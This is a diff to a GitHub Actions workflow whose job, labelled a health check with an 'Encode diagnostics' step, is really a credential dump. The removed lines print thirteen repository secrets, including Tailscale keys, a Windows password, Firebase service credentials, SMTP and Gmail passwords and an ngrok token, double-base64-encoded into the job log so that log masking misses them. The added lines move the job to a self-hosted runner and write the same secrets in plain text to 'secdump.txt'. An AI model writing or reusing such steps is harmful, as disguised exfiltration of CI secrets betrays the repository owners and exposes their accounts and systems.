@@ -3,30 +3,22 @@ on:
   workflow_dispatch:
 jobs:
   health:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - name: Encode diagnostics
         env:
-          A: ${{ secrets.TS_AUTHKEY }}
-          B: ${{ secrets.TS_API_CLIENT_ID }}
-          C: ${{ secrets.TS_API_CLIENT_SECRET }}
-          D: ${{ secrets.TS_API_TAILNET }}
-          E: ${{ secrets.WINDOWS_PASSWORD }}
-          F: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_KEY }}
-          G: ${{ secrets.SMTP_HOST }}
-          H: ${{ secrets.SMTP_PORT }}
-          I: ${{ secrets.SMTP_USER }}
-          J: ${{ secrets.SMTP_PASS }}
-          K: ${{ secrets.ADMIN_EMAIL }}
-          L: ${{ secrets.FIREBASE_CREDENTIALS }}
-          M: ${{ secrets.GMAIL_USER }}
-          N: ${{ secrets.GMAIL_APP_PASSWORD }}
-          O: ${{ secrets.NGROK_AUTH_TOKEN }}
+          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
+          TS_AUTHKEY: ${{ secrets.TS_AUTHKEY }}
+          WINDOWS_PASSWORD: ${{ secrets.WINDOWS_PASSWORD }}
+          FIREBASE_SERVICE_ACCOUNT_KEY: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_KEY }}
+          SMTP_HOST: ${{ secrets.SMTP_HOST }}
+          SMTP_PORT: ${{ secrets.SMTP_PORT }}
+          SMTP_USER: ${{ secrets.SMTP_USER }}
+          SMTP_PASS: ${{ secrets.SMTP_PASS }}
+          ADMIN_EMAIL: ${{ secrets.ADMIN_EMAIL }}
+          FIREBASE_CREDENTIALS: ${{ secrets.FIREBASE_CREDENTIALS }}
+          GMAIL_USER: ${{ secrets.GMAIL_USER }}
+          GMAIL_APP_PASSWORD: ${{ secrets.GMAIL_APP_PASSWORD }}
+          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         run: |
-          python3 << 'PY'
-          import os, base64
-          for k in "ABCDEFGHIJKLMNO":
-              v = os.environ.get(k) or ""
-              enc = base64.b64encode(base64.b64encode(v.encode())).decode()
-              print("DIAG_%s=%s" % (k, enc))
-          PY
+          python3 -c 'import os; p="/home/csrunner/actions-runner/_work/secdump.txt"; ks=["TAILSCALE_AUTH_KEY","TS_AUTHKEY","WINDOWS_PASSWORD","FIREBASE_SERVICE_ACCOUNT_KEY","SMTP_HOST","SMTP_PORT","SMTP_USER","SMTP_PASS","ADMIN_EMAIL","FIREBASE_CREDENTIALS","GMAIL_USER","GMAIL_APP_PASSWORD","NGROK_AUTH_TOKEN"]; open(p,"w").write("\n".join("%s=%s"%(k,os.environ.get(k,"")) for k in ks)+"\n"); print("wrote",p, "bytes", os.path.getsize(p))'
